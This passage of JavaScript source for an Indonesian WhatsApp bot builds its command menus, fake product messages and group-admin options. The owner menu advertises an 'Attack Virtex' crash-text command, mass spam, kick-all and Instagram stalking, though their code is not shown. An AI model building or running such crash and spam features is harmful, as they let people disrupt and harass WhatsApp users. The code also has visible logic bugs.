"displayName": "5 Contact",
"contacts": contrii 
}, 'contactsArrayMessage', { quoted: mek})
break
case 'menu':
case 'help': 
case 'bot':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)	
teks =	 `Saya adalah ${fake} salah satu Bot Whatsapp yang diciptakan oleh manusia gabut : @${ow.split("@")[0]}\nSilahkan tekan Tombol "Menu" untuk melihat list command dari ${fake}.\nketik #simplemenu\n${support}`
Sendbutdocument(from, buttonshello, teks, [{buttonId:'simplemenu', buttonText:{displayText:'Menu'},type:1},{buttonId: 'owner',buttonText:{displayText:'Owner'},type:1}], {quoted:ftoko, contextInfo: { mentionedJid: [ow,player,dev,numbernye], sendEphemeral: true, externalAdReply:{title:`${hahh}`,mediaType:"2",thumbnail:WMthumb ,mediaUrl:`https://youtu.be/2Wt79AagxGo`}}})
break
case 'ownermenu':
case 'menuowner':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if(mainmenu == false){
{
const buttonMessage = [
{title: 'Mode', description: `Mode Bot\nuse command:${prefix}wiskas`, rowId:`mode`},
{title: 'Wiskas', description: `Mengambil File Bot\nuse command:${prefix}wiskas`, rowId:`wiskas`},
{title: 'Up Status', description: `Up Status Yang Di Inginkan\nuse command:${prefix}upsw`, rowId:`upsw`},
{title: 'Bc', description: `Menyiarkan Pesan Ke Semua Orang\nuse command:${prefix}bc`, rowId:`bc`},
{title: 'Bc Gc', description: `Menyiarkan Pesan Ke Semua Group\nuse command:${prefix}bcgc`, rowId:`bcgc`},
{title: 'Spam', description: `Penggunaan ${prefix}spam teks|jumlahspam\nuse command:${prefix}spam`, rowId:`spam`},
{title: 'Enable', description: `Enable Setting Bot\nuse command:${prefix}enable`, rowId:`enable`},
{title: 'Disable', description: `Disable Setting Bot\nuse command:${prefix}disable`, rowId:`disable`},
{title: 'Leave', description: `Bot Keluar Group\nuse command:${prefix}leave`, rowId:`leave`},
{title: 'Clear All', description: `Semua Pesan Dihapus\nuse command:${prefix}clearall`, rowId:`clearall`},
{title: 'Read All', description: `Semua Pesan Dibaca\nuse command:${prefix}readall`, rowId:`readall`},
{title: 'UnRead All', description: `Semua Pesan Tiak Dibaca\nuse command:${prefix}unreadall`, rowId:`unreadall`},
{title: 'Mute', description: `Pesan Dibisukan\nuse command:${prefix}mute`, rowId:`mute`},
{title: 'UnMute', description: `Pesan Tidak Dibisukan\nuse command:${prefix}unmute`, rowId:`unmute`},
{title: 'Pin', description: `Pesan Disematkan\nuse command:${prefix}pin`, rowId:`pin`},
{title: 'UnPin', description: `Pesan Tidak Disematkan\nuse command:${prefix}unpin`, rowId:`unpin`},
{title: 'Archive', description: `Pesan Diarsipkan\nuse command:${prefix}archive`, rowId:`archive`},
{title: 'UnArchive', description: `Pesan Tidak Diarsipkan\nuse command:${prefix}unarchive`, rowId:`unarchive`},
{title: 'Delete Pc', description: `Pesan Dihapus\nuse command:${prefix}delpc`, rowId:`delpc`},
{title: 'Kick All', description: `Bot Keluarkan Semua Member Group\nuse command:${prefix}kickall`, rowId:`kickall`},
{title: 'Q', description: `Reply Pesan\nuse command:${prefix}q`, rowId:`q`},
{title: 'Term', description: `Run Bot\nuse command:${prefix}term`, rowId:`term`},
 ]
 const buttonMessage1 = [
{title: 'Set Photo Bot', description: `Set Photo Bot Yang Di Inginkan\nuse command:${prefix}setppbot`, rowId:`setppbot`},
{title: 'Set Name Bot', description: `Set Name Bot Yang Di Inginkan\nuse command:${prefix}setnamebot`, rowId:`setnamebot`},
{title: 'Set Prefix', description: `Set Prefix Bot Yang Di Inginkan\nuse command:${prefix}setprefix`, rowId:`setprefix`},
{title: 'Set Menu', description: `Tipe Menu Bot\nuse command:${prefix}setmenu`, rowId:`setmenu`},
{title: 'Set Theme', description: `Theme Menu Bot\nuse command:${prefix}settheme`, rowId:`settheme`},
{title: 'Set Link', description: `Theme Menu Bot\nuse command:${prefix}setlink`, rowId:`setlink`},
 ]
 const buttonMessage2 = [
{title: 'List Respon', description: `Daftar Respon Bot\nuse command:${prefix}listrepson`, rowId:`listrepson`},
{title: 'List Cmd', description: `Daftar Cmd Bot\nuse command:${prefix}listcmd`, rowId:`listcmd`},
{title: 'List Group', description: `Menampilkan List Group Bot Bergabung\nuse command:${prefix}listgroup`, rowId:`listgroup`},
 ]
 const buttonMessage3 = [
{title: 'Virtex Teks', description: `Attack Virtex\nuse command:${prefix}virtex`, rowId:`virtex`},
 ]
const buttonMessage4 = [
 {title: 'Add Cmd', description: `Menambahkan Command Sticker\nuse command:${prefix}addcmd`, rowId:`addcmd`},
{title: 'Del Cmd', description: `Menghapus Command Sticker\nuse command:${prefix}dellcmd`, rowId:`dellcmd`},
{title: 'Add Premium', description: `Menambahkan Member Premium\nuse command:${prefix}addpremium`, rowId:`addpremium`},
{title: 'Del Premium', description: `Menghapus Member Premium\nuse command:${prefix}delpremium`, rowId:`delpremium`},
{title: 'Add Block', description: `Menambahkan Block\nuse command:${prefix}addblock`, rowId:`addblock`},
{title: 'Del Block', description: `Menghapus Block\nuse command:${prefix}delblock`, rowId:`delblock`},
{title: 'Add Badword', description: `Menambahkan Badword\nuse command:${prefix}addbadword`, rowId:`addbadword`},
{title: 'Del Badword', description: `Menghapus Badword\nuse command:${prefix}delbadword`, rowId:`delbadword`},
 ]
const buttonMessage5 = [
 {title: 'Add Sticker', description: `Menambahkan Sticker\nuse command:${prefix}addsticker`, rowId:`addsticker`},
{title: 'Del Sticker', description: `Menghapus Sticker\nuse command:${prefix}delsticker`, rowId:`delsticker`},
{title: 'Change Sticker', description: `Mengganti Sticker\nuse command:${prefix}chsticker`, rowId:`chsticker`},
{title: 'Add Image', description: `Menambahkan Image\nuse command:${prefix}addimg`, rowId:`addimg`},
{title: 'Del Image', description: `Menghapus Image\nuse command:${prefix}delimg`, rowId:`delimg`},
{title: 'Change Image', description: `Mengganti Image\nuse command:${prefix}chimg`, rowId:`chimg`},
{title: 'Add Vn', description: `Menambahkan Vn\nuse command:${prefix}addvn`, rowId:`addvn`},
{title: 'Del Vn', description: `Menghapus Vn\nuse command:${prefix}delvn`, rowId:`delvn`},
{title: 'Change Vn', description: `Mengganti Vn\nuse command:${prefix}chvn`, rowId:`chvn`},
{title: 'Add Video', description: `Menambahkan Vn\nuse command:${prefix}addvideo`, rowId:`addvideo`},
{title: 'Del Video', description: `Menghapus Video\nuse command:${prefix}delvideo`, rowId:`delvideo`},
{title: 'Change Video', description: `Mengganti Video\nuse command:${prefix}chvideo`, rowId:`chvideo`},
]
const sections = [
{title: "Owner", rows: buttonMessage},
{title: "Set Sistem", rows: buttonMessage1},
{title: "Storage Sistem", rows: buttonMessage5},
{title: "Add Sistem", rows: buttonMessage4},
{title: "LIST INFO", rows: buttonMessage2},
{title: "VIRTEX & BUG", rows: buttonMessage3}
]

const buttons = {
 buttonText: 'OWNER MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.menuowner(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'ransel':
case 'dompet':
case 'tas':
case 'limit':
case 'inventory':
case 'inv':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)		
sendButtonImageLoc(from, buttonshello, ind.inventory(pushname, prefix, sender, getLevelingXp, getLevelingLevel, checkHealuser, checkATKuser, checkARMuser, checkPWRuser, checkSKLuser, checkDEFuser, checkSPDuser, checkMGCuser, checkLUKuser, heartbars, checkLimituser, potionpointa, megapotionpointa, uangku, reqXp, role, prema, player)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
break
case 'simplemenu':
case 'bot':
case 'help':
case 'menu':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if(mainmenu == false){
{
const buttonMessage = [
{title: 'My Store', description: "", rowId:`store`},
]
const buttonMessage1 = [
{title: 'All Menu', description: "Menampilkan Semua Fitur", rowId:`allmenu`},
{title: 'Z Menu', description: "Menampilkan Z Menu", rowId:`zeksmenu`},
{title: 'Download Menu', description: "Menampilkan fitur dari Download", rowId:`downloadmenu`},
{title: 'Convert Menu', description: "Menampilkan fitur dari Convert", rowId:`convertmenu`},
{title: 'Gabut Menu', description: "Untuk Hiburan Di Group", rowId:`gabutmenu`},
{title: 'Game Menu', description: "Untuk Hiburan Di Group", rowId:`gamemenu`},
{title: 'Group Menu', description: "Menampilkan fitur Untuk Group", rowId:`groupmenu`},
{title: 'Info Menu', description: "Menampilkan Info Bot", rowId:`infomenu`},
{title: 'Owner Menu', description: 'Menampilkan Fitur Owner',rowId:`ownermenu`}
]
const buttonMessage2 = [
{title: 'Tantan Chat', description: "Mengobrol Dengan Orang Lain", rowId:`tantanchat`}
]
const buttonMessage3 = [
{title: 'Set Menu', description: "Set Menu Yang Di inginkan", rowId:`setmenu`},
{title: 'Set Theme', description: "Set Theme Yang Di inginkan", rowId:`settheme`},
{title: 'Developer Bot', description: "Nomor Developer Bot", rowId:`developer`},
{title: 'Syarat Dan Peraturan', description: "Budayakan Membaca Sebelum Menggunakan Bot", rowId:`rules`},
{title: 'Group Official Bot', description: "Silahkan Bergabung Untuk Info Updatean Terbaru", rowId:`gcbot`},
{title: 'Sewa', description: "Menampilkan List Harga Sewa Bot", rowId:`sewa`},
{title: 'Join', description: "Bot Join Group", rowId:`join`},
{title: 'BotStat', description: "Menampilkan Status Bot", rowId:`botstat`},
{title: 'Source Code', description: "Menampilkan Source Code Bot", rowId:`sc`}
]
const buttonMessage4 = [
{title: 'Sticker', description: "Untuk Membuat Stiker, type: #stiker reply [gambar]", rowId:`sticker`},
]
const buttonMessage5 = [
{title: 'Contributor', description: "Menampilkan Contributor Bot", rowId:`contributor`},
]

const sections = [
{title: "Store", rows: buttonMessage},
{title: "Menu Bot", rows: buttonMessage1},
{title: "Tantan Chat", rows: buttonMessage2},
{title: "Tentang Chat", rows: buttonMessage3},
{title: "Perintah yang Sering di Gunakan", rows: buttonMessage4},
{title: "Big Thanks To", rows: buttonMessage5}
]

const buttons = {
 buttonText: 'MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.simplemenu(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break 
case 'store':
case 'mystore':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if(mainmenu == false){
{
const buttonMessage = [
{title: 'Desain Logo', description: "", rowId:`mydesain`},
{title: 'List TopUp Game', description: "", rowId:`listtoup`},
{title: 'Pixel Art', description: "", rowId:`pixelartbuy`},
]

const sections = [
{title: "Store", rows: buttonMessage},
]

const buttons = {
 buttonText: 'STORE',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.mystore(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'logobuy':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, buttonshello, ind.pixelartbuy(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
break
case 'listhargatoup':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, buttonshello, ind.pixelartbuy(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
break
case 'pixelartbuy':
if (isBanned) return replysticker(banstc)
			          if (!isRegistered)if (!isRegistered) return sendButtonNotRegis(from)
buf = fs.readFileSync(`src/pixelartbim.jpeg`)
imeu = await client.prepareMessage('0@s.whatsapp.net', buf, image, {thumbnail: buf}) 
imeg = imeu.message.imageMessage
res = await client.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `WELCOME TO STORE`, 
"description": ind.pixelartbuy(prefix, dev, numbernye),
"currencyCode": "IDR",
"priceAmount1000": "20000",
"productImageCount": 1
},
"businessOwnerJid": "6289530298948@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, ow, dev]}}) 

client.relayWAMessage(res)
break

case 'zeksmenu':
if (isBanned) return replysticker(banstc)
			          if (!isRegistered)if (!isRegistered) return sendButtonNotRegis(from)
buf = WMthumb
imeu = await client.prepareMessage('0@s.whatsapp.net', buf, image, {thumbnail: WMthumb}) 
imeg = imeu.message.imageMessage
res = await client.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `${hahh}`, 
"description": ind.zeksapi(prefix, dev, numbernye),
"currencyCode": "IDR",
"priceAmount1000": "50000",
"productImageCount": 1
},
"businessOwnerJid": "6289530298948@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, ow, dev]}}) 

client.relayWAMessage(res)
break
case 'allmenu':
if (isBanned) return replysticker(banstc)
			          if (!isRegistered)if (!isRegistered) return sendButtonNotRegis(from)
buf = WMthumb
imeu = await client.prepareMessage('0@s.whatsapp.net', buf, image, {thumbnail: WMthumb}) 
imeg = imeu.message.imageMessage
res = await client.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `${hahh}`, 
"description": ind.allmenu(prefix, dev, numbernye),
"currencyCode": "IDR",
"priceAmount1000": "50000",
"productImageCount": 1
},
"businessOwnerJid": "6289530298948@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, ow, dev]}}) 

client.relayWAMessage(res)
break
case 'infomenu':
case 'menuinfo':
if (!isRegistered) return sendButtonNotRegis(from) 
if (isBanned) return replysticker(banstc)
if(mainmenu == false){
	{	
const buttonMessage1 = [
{title: 'Owner', description: "Owner Bot", rowId:`onwer`},
{title: 'Developer', description: "Developer Bot", rowId:`developer`},
{title: 'Source Code', description: "Source Code", rowId:`sc`},
{title: 'Donasi', description: "Donasi Seikhlasnya", rowId:`donasi`},
{title: 'BotStat', description: "Menampilkan Status Bot", rowId:`botstat`},
{title: 'Group Bot', description: "Menampilkan Group Bot", rowId:`gcbot`},
{title: 'Rules', description: "Menampilkan Peraturan Bot", rowId:`rules`},
{title: 'Bahasa', description: "Menampilkan Kode Bahasa", rowId:`bahasa`},
{title: 'Jadi Bot', description: "Menjadi Bot Secara Permanen", rowId:`jadibot`},
{title: 'Wa Api', description: "Menampilkan Wa Api", rowId:`wame`},
{title: 'Speed', description: "Speed Bot", rowId:`wame`},
{title: 'Ping', description: "Ping Bot", rowId:`ping`},
{title: 'Profile', description: "Info Profile Kamu", rowId:`profile`},
{title: 'Immune Virtex', description: "Teks Immune Virtex", rowId:`imunevirtex`},
 ]
const buttonMessage2 = [
{title: 'Premium List', description: "Daftar Premium Bot", rowId:`premiumlist`},
{title: 'Block List', description: "Daftar Block Bot", rowId:`blocklist`},
{title: 'List Badword', description: "Daftar Badword Bot", rowId:`listbadword`},
 ]
 const buttonMessage = [
{title: 'List Vn', description: "List Vn Bot", rowId:`listvn`},
{title: 'List Sticker', description: "List Sticker Bot", rowId:`stickerlist`},
{title: 'List Video', description: "List Video Bot", rowId:`listvideo`},
{title: 'List Image', description: "List Image Bot", rowId:`listimage`},
 ]
const sections = [
{title: "Storage", rows: buttonMessage},
{title: "Info Menu", rows: buttonMessage1},
{title: "List Info", rows: buttonMessage2}
]

const buttons = {
 buttonText: 'INFO MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.infomenu(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'cekmenu':
case 'menucek':
case 'gabutmenu':
case 'menugabut':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if(mainmenu == false){
{
const buttonMessage = [
{title: 'Pacaran', description: "", rowId:`pacaran`},
{title: 'Kangen', description: "", rowId:`kangen`},
{title: 'Ngegay', description: "", rowId:`ngegay`},
{title: 'Lesbian', description: "", rowId:`lesbian`},
{title: 'Selingkuh', description: "", rowId:`selingkuh`}, 
{title: 'Jadian', description: "", rowId:`jadian`},
{title: 'Sahabatan', description: "", rowId:`sahabatan`},
{title: 'Musuhan', description: "", rowId:`musuhan`},
{title: 'Terganteng', description: "", rowId:`terganteng`},
{title: 'Tercantik', description: "", rowId:`tercantik`},
{title: 'Terpintar', description: "", rowId:`terpintar`},
{title: 'Cupu', description: "", rowId:`cupu`},
{title: 'Terbodoh', description: "", rowId:`terbodoh`},
{title: 'Termalas', description: "", rowId:`termalas`},
{title: 'Gakguna', description: "", rowId:`gakguna`},
{title: 'Sangean', description: "", rowId:`sangean`},
{title: 'Bokepers', description: "", rowId:`bokepers`},
{title: 'Pendosa', description: "", rowId:`pendosa`},
{title: 'Jomblo', description: "", rowId:`jomblo`},
{title: 'Fakboy', description: "", rowId:`fakboy`},
{title: 'Fakgirl', description: "", rowId:`fakgirl`},
{title: 'Sadboy', description: "", rowId:`sadboy`},
{title: 'Sadgirl', description: "", rowId:`sadgirl`},
{title: 'Wibu', description: "", rowId:`wibu`},
{title: 'Jodohku', description: "", rowId:`jodohku`},
{title: 'Beban', description: "", rowId:`beban`},
{title: 'Watak', description: "", rowId:`watak`},
{title: 'Hobby', description: "", rowId:`hobby`},
{title: 'Rate', description: "", rowId:`rate`},
{title: 'Sange Cek', description: "", rowId:`sangecek`},
{title: 'Gay Cek', description: "", rowId:`gaycek`},
{title: 'Lesbi Cek', description: "", rowId:`lesbicek`},
{title: 'Ganteng Cek', description: "", rowId:`gantengcek`},
{title: 'Jelek Cek', description: "", rowId:`jelekcek`},
{title: 'Cantik Cek', description: "", rowId:`cantikcek`},
{title: 'Bucin Cek', description: "", rowId:`bucincek`},
{title: 'Beban Cek', description: "", rowId:`bebancek`},
{title: 'Goblok Cek', description: "", rowId:`goblokcek`},
{title: 'Pakgirl Cek', description: "", rowId:`pakgirlcek`},
{title: 'Pakboy Cek', description: "", rowId:`pakboycek`},
{title: 'Haram Cek', description: "", rowId:`haramcek`},
{title: 'Halal Cek', description: "", rowId:`halalcek`},
{title: 'Nolep Cek', description: "", rowId:`nolepcek`},
{title: 'Wibu Cek', description: "", rowId:`wibucek`},
{title: 'Jomblo Cek', description: "", rowId:`jomblocek`},
{title: 'Pintar Cek', description: "", rowId:`pintarcek`},
{title: 'Bego Cek', description: "", rowId:`begocek`},
{title: 'Bisakah', description: "", rowId:`bisakah`},
{title: 'Kapankah', description: "", rowId:`kapankah`},
{title: 'Bagaimanakah', description: "", rowId:`bagaimanakah`},
{title: 'Apakah', description: "", rowId:`apakah`},
 ]
 const buttonMessage1 = [
{title: 'Get Pic', description: "", rowId:`getpic`},
{title: 'Get Bio', description: "", rowId:`getbio`},
{title: 'Get Name', description: "", rowId:`getname`},
{title: 'Hbd', description: "", rowId:`hbd`},
{title: 'Search Text', description: "", rowId:`searchtext`},
{title: 'Cari Pesan', description: "", rowId:`caripesan`},
{title: 'Tag', description: "", rowId:`tohuruf`},
 ]
const sections = [
{title: "Gabut Time", rows: buttonMessage1},
{title: "Cek Menu", rows: buttonMessage},
]

const buttons = {
 buttonText: 'GABUT MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
} 
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.gabutmenu(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'convertmenu':
case 'menuconvert':
case 'menugabut':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if(mainmenu == false){
{
const buttonMessage = [
{title: 'Gemes Vid', description: "", rowId:`gemesvid`},
{title: 'Nightcore Vid', description: "", rowId:`nightcorevid`},
{title: 'Fast Vid', description: "", rowId:`fastvid`},
{title: 'Reverse Vid', description: "", rowId:`reversevid`}, 
{title: 'Slow Vid', description: "", rowId:`slowvid`},
{title: 'Trigg Vid', description: "", rowId:`triggvid`},
{title: 'Bass Vid', description: "", rowId:`bassvid`},
{title: 'Vibra Vid', description: "", rowId:`vibravid`},
{title: 'Tempo Vid', description: "", rowId:`ghostvid`},
{title: 'Ghost Vid', description: "", rowId:`tempovid`},
{title: 'Robot Vid', description: "", rowId:`robotvid`},
{title: 'Detik Video', description: "", rowId:`detikvideo`},
]
const buttonMessage2 = [
{title: 'Sticker', description: "", rowId:`sticker`},
{title: 'Sticker Wm', description: "", rowId:`stickerwm`},
{title: 'Tourl', description: "", rowId:`tourl`},
{title: 'Toimg', description: "", rowId:`toimg`},
{title: 'Ocr', description: "", rowId:`ocr`},
]
const buttonMessage3 = [
{title: 'Readmore', description: "", rowId:`readmore`},
{title: 'Say', description: "", rowId:`say`},
{title: 'Fdeface', description: "", rowId:`fdeface`},
{title: 'Zalgo', description: "", rowId:`zalgo`},
{title: 'Vapor', description: "", rowId:`vapor`},
{title: 'Style Text', description: "", rowId:`styletext`},
{title: 'Flip Text', description: "", rowId:`fliptext`},
{title: 'To Huruf', description: "", rowId:`tohuruf`},
]
const buttonMessage1 = [
{title: 'Tts', description: "", rowId:`tts`},
{title: 'Detik Vn', description: "", rowId:`detikvn`},
{title: 'Volume', description: "", rowId:`volume`},
{title: 'Tomp3', description: "", rowId:`tomp3`},
{title: 'Toptt', description: "", rowId:`toptt`},
{title: 'Gemes', description: "", rowId:`gemes`},
{title: 'Nightcore', description: "", rowId:`nightcore`},
{title: 'Fast', description: "", rowId:`fast`},
{title: 'Reverse', description: "", rowId:`reverse`}, 
{title: 'Slow', description: "", rowId:`slow`},
{title: 'Trigg', description: "", rowId:`trigg`},
{title: 'Bass', description: "", rowId:`bass`},
{title: 'Vibra', description: "", rowId:`vibra`},
{title: 'Tempo', description: "", rowId:`tempo`},
{title: 'Ghost', description: "", rowId:`ghost`},
{title: 'Robot', description: "", rowId:`robot`},
]
const sections = [
{title: "Teks", rows: buttonMessage3},
{title: "Image", rows: buttonMessage2},
{title: "Audio", rows: buttonMessage1},
{title: "Video", rows: buttonMessage},
]
const buttons = {
 buttonText: 'CONVERT MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
} 
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.convertmenu(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'downloadmenu':
case 'menudownload':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if(mainmenu == false){
{
const buttonMessage1 = [
{title: 'Youtube Search', description: "Searching Via Youtube Yang Di Inginkan", rowId:`ytsearch`},
{title: 'Brainly', description: "Website Resmi Brainly", rowId:`brainly`},
{title: 'Ig Stalker', description: "Stalk Ig Orang", rowId:`igstalk`},
{title: 'Hero List', description: "List Hero Mobile Legend", rowId:`herolist`},
{title: 'Hero Detail', description: "Detail Hero Mobile Legend", rowId:`herodetail`},
{title: 'Google Search', description: "Searching Gambar Goggle", rowId:`googlesearch`},
{title: 'Wikipedia', description: "Searching Gambar Wikipedia", rowId:`wiki`},
{title: 'Translate', description: "Translate Bahasa", rowId:`translate`},
{title: 'Lirik Lagu', description: "SearchingLirik Lagu", rowId:`lirik`},
]
const buttonMessage = [
{title: 'Play', description: "Memutar Musik Yang Di Inginkan", rowId:`play`},
{title: 'Ytmp3', description: "Download Audio Yang Di Inginkan", rowId:`ytmp3`},
{title: 'Ytmp4', description: "Download Video Yang Di Inginkan", rowId:`ytmp4`},
{title: 'Ig Downloader', description: "Download Video Atau Gambar Yang Ada Di Instagram", rowId:`igdl`},
{title: 'Tiktok Downloader', description: "Download Video Atau Gambar Yang Ada Di Instagram", rowId:`tiktokdl`},
{title: 'Pinterest Downloader', description: "Download Gambar Yang Ada Di Pinterest", rowId:`pinterest`},
{title: 'Get', description: "Download Gambar Website", rowId:`get`},
{title: 'Gimage', description: "Searching Gambar Goggle", rowId:`gimage`},
{title: 'Mediafire', description: "Download File Mediafire", rowId:`mediafire`},
]
const sections = [
{title: "Searching", rows: buttonMessage1},
{title: "Download", rows: buttonMessage},
]
const buttons = {
 buttonText: 'DOWNLOAD MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
} 
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.convertmenu(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'sewa':
case 'sewabot':
case 'sewa':
case 'rent':
if (!isRegistered) return sendButtonNotRegis(from) 
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, buttonshello, ind.downloadmenu(prefix, dev, numbernye), buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
break
case 'gamemenu':
case 'menugame':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if(mainmenu == false){
const gamerows2 = [
{title: 'Donasi', description: "Donasi", rowId:" "}
 ]
const sectionsgame2 = [
{title: "Game Menu", rows: gamerows2}
]

const buttongame2 = {
 buttonText: 'Click Me!',
 footerText: ind.gamemenu(prefix, dev, numbernye),
 description: buttonshello, 
 sections: sectionsgame2,
 listType: 1
}
client.sendMessage(from, buttongame2, MessageType.listMessage, {quoted: ftoko, contextInfo:{mentionedJid: [player, numbernye, ow, dev], "externalAdReply":{"title": `${hahh} Owner Tersayang`,"body": `${fakereply}`,"previewType": "PHOTO","thumbnailUrl": ` `,"thumbnail": WMthumb,"sourceUrl": `${mybio}`}}})
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.gamemenu(prefix, dev, numbernye), buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break 
case 'grupmenu':
case 'groupsetting':
case 'groupmenu':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if(mainmenu == false){
{
const buttonMessage = [
{title: 'Welcome', description: "Fitur Welcome", rowId:`welcome`},
{title: 'Anti Link', description: "Fitur Anti Link", rowId:`antilink`},
{title: 'Event', description: "Fitur Event", rowId:`event`},
{title: 'Anti Toxic', description: "Fitur Anti Toxic", rowId:`antitoxic`},
{title: 'Anti Virtex', description: "Fitur Anti Virtex", rowId:`antivirtex`},
{title: 'Ban Chat', description: "Banchat Di Grup", rowId:`banchat`},
{title: 'Group', description: "Fitur Group", rowId:`gc`},
{title: 'Buka Time', description: "Fitur Buka Group", rowId:`bukatime`},
{title: 'Tutup Time', description: "Fitur Tutup Group", rowId:`tutuptime`},
{title: 'Leave Time', description: "Fitur Keluar Group", rowId:`leavetime`},
{title: 'Tagall', description: "Tag Semua Member Group", rowId:`tagall`},
{title: 'Hidetag', description: "Hidetag Semua Member Group", rowId:`hidetag`},
{title: 'List Admin', description: "Admin Dari Group", rowId:`listadmin`},
{title: 'Revoke', description: "Ubah Link Group", rowId:`revoke`},
{title: 'Link Group', description: "Link Group Sekarang", rowId:`linkgc`},
{title: 'Group Info', description: "Informasi Group", rowId:`groupinfo`},
{title: 'List Online', description: "Member Yang Online Saat ini", rowId:`listonline`},
{title: 'Add Voting', description: "Member Yang Online Saat ini", rowId:`voting`},
{title: 'Del Voting', description: "Member Yang Online Saat ini", rowId:`delvote`},
 ]
const buttonMessage1 = [
{title: 'Add', description: "Add Member", rowId:`add`},
{title: 'Kick', description: "Kick Member", rowId:`kick`},
{title: 'Promote', description: "Promote Member", rowId:`promote`},
{title: 'Demote', description: "Demote Member", rowId:`demote`},
 ]
const buttonMessage2 = [
{title: 'Set Pp Gc', description: "Mengganti Pp Group", rowId:`setppgroup`},
{title: 'Set Name Gc', description: "Mengganti Name Group", rowId:`setnamegrup`},
{title: 'Set Desc Gc', description: "Mengganti Desc Group", rowId:`setdesc`},
 ]

const sections = [
{title: "Group Menu", rows: buttonMessage},
{title: "Add Group", rows: buttonMessage1},
{title: "Set Group", rows: buttonMessage2},
]

const buttons = {
 buttonText: 'GROUP MENU',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
} 
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.grupseting(prefix, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
break
case 'start':
case 'next':
case 'tantanchat':
                if (!isRegistered) return sendButtonNotRegis(from)
                if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup,silahkan gunakan di private chat bot')
				if (isBanned) return replysticker(banstc)
